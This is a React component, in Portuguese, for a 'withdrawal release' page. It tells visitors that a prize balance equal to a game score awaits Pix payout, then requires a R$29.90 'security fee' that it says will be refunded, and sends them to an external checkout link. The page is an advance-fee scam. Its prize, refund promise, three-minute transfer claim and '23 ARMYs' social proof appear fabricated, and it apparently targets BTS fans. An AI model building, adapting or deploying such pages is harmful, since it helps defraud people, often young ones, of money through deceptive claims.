
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Shield, Lock, Briefcase, Lightbulb, MapPin, Gift, CheckCircle } from 'lucide-react';
import { useEffect } from 'react';

interface TaxaLiberacaoProps {
  score: number;
  pixKey: string;
  onPayment: () => void;
}

const TaxaLiberacao = ({
  score,
  pixKey,
  onPayment
}: TaxaLiberacaoProps) => {
  useEffect(() => {
    // Carregar scripts do Wistia
    const script1 = document.createElement('script');
    script1.src = 'https://fast.wistia.com/player.js';
    script1.async = true;
    document.head.appendChild(script1);

    const script2 = document.createElement('script');
    script2.src = 'https://fast.wistia.com/embed/zxn2a30itn.js';
    script2.async = true;
    script2.type = 'module';
    document.head.appendChild(script2);

    // Adicionar estilos do Wistia
    const style = document.createElement('style');
    style.textContent = `
      wistia-player[media-id='zxn2a30itn']:not(:defined) { 
        background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/zxn2a30itn/swatch'); 
        display: block; 
        filter: blur(5px); 
        padding-top:56.25%; 
      }
    `;
    document.head.appendChild(style);

    return () => {
      // Cleanup ao desmontar componente
      if (script1.parentNode) script1.parentNode.removeChild(script1);
      if (script2.parentNode) script2.parentNode.removeChild(script2);
      if (style.parentNode) style.parentNode.removeChild(style);
    };
  }, []);

  const handlePayment = () => {
    onPayment();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-pink-800 flex flex-col p-4 overflow-y-auto">
      <div className="max-w-2xl mx-auto w-full space-y-6 py-6">
        
        {/* Header */}
        <Card className="border-2 border-yellow-400 shadow-2xl">
          <CardHeader className="bg-gradient-to-r from-yellow-400 to-yellow-500 p-4">
            <CardTitle className="text-center text-xl font-bold text-gray-800">LIBERAÇÃO DE SAQUE</CardTitle>
          </CardHeader>
          <CardContent className="p-6 text-center">
            <h2 className="font-bold text-purple-800 mb-4 text-xl">
              🎉 Parabéns novamente!
            </h2>
            
            <p className="text-gray-700 text-lg mb-4">
              Seu saldo de <span className="font-bold text-green-600">R${score},00</span> está pronto para ser resgatado via Pix.
            </p>
            
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
              <p className="text-blue-800 text-sm">
                ✅ Mas, por motivos de segurança e validação de identidade, é necessário o pagamento de uma pequena taxa única de <span className="font-bold">R$29,90</span>. Esse valor será devolvido junto com o deposito da sua recompensa.
              </p>
            </div>
            
            {/* Vídeo Wistia */}
            <div className="rounded-lg overflow-hidden mb-6">
              <div 
                dangerouslySetInnerHTML={{
                  __html: '<wistia-player media-id="zxn2a30itn" aspect="1.7777777777777777"></wistia-player>'
                }}
              />
            </div>
          </CardContent>
        </Card>

        {/* Informações da Taxa */}
        <Card className="border border-gray-300 shadow-lg">
          <CardContent className="p-6">
            <h3 className="text-lg font-bold text-gray-800 mb-4">Essa taxa serve para:</h3>
            
            <div className="space-y-3 mb-6">
              <div className="flex items-start space-x-3">
                <Lock className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">Garantir que o CPF/Chave Pix usada é válida</p>
              </div>
              
              <div className="flex items-start space-x-3">
                <Shield className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">Proteger o sistema contra bots, fraudes e múltiplos saques falsos</p>
              </div>
              
              <div className="flex items-start space-x-3">
                <Briefcase className="w-5 h-5 text-purple-600 mt-0.5 flex-shrink-0" />
                <p className="text-gray-700 text-sm">Cobrir os custos de transação e operação da plataforma</p>
              </div>
            </div>

            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
              <div className="flex items-start space-x-2">
                <Lightbulb className="w-5 h-5 text-yellow-600 mt-0.5 flex-shrink-0" />
                <div>
                  <p className="font-bold text-yellow-800 text-sm mb-1">💡 Importante:</p>
                  <p className="text-yellow-700 text-sm">Após o pagamento, sua chave Pix será vinculada automaticamente ao seu saldo e o valor será transferido em até 3 minutos.</p>
                </div>
              </div>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
              <div className="flex items-start space-x-2">
                <MapPin className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
                <p className="text-blue-800 text-sm">
                  📌 Esse procedimento existe para manter a plataforma 100% segura e funcional para todos os participantes.
                </p>
              </div>
            </div>

            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-6">
              <div className="flex items-start space-x-2">
                <Gift className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
                <p className="text-green-800 text-sm font-medium">
                  🎁 Você chegou até aqui com mérito. Agora é só confirmar sua identidade e aproveitar o que conquistou!
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Botão de Pagamento */}
        <Card className="border-2 border-green-400 shadow-xl">
          <CardContent className="p-6">
            <Button 
              onClick={() => window.location.href = 'https://checkout.viperpay.com.br/TpDmjqoT'} 
              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-4 text-lg shadow-lg mb-4 text-center"
            >
              LIBERAR O SAQUE AGORA
            </Button>            
            <div className="text-center text-sm text-gray-600 mb-4">
              Se você concorda com a taxa de seguraça para realizar o saque da sua recompensa, clique no botão abaixo.
            </div>
            
            <div className="bg-green-50 border border-green-200 rounded-lg p-3 text-center">
              <div className="flex items-center justify-center space-x-2">
                <CheckCircle className="w-4 h-4 text-green-600" />
                <p className="text-green-700 text-sm font-medium">Você não está sozinha: 23 ARMYs já resgataram sua recompensa hoje!</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default TaxaLiberacao;
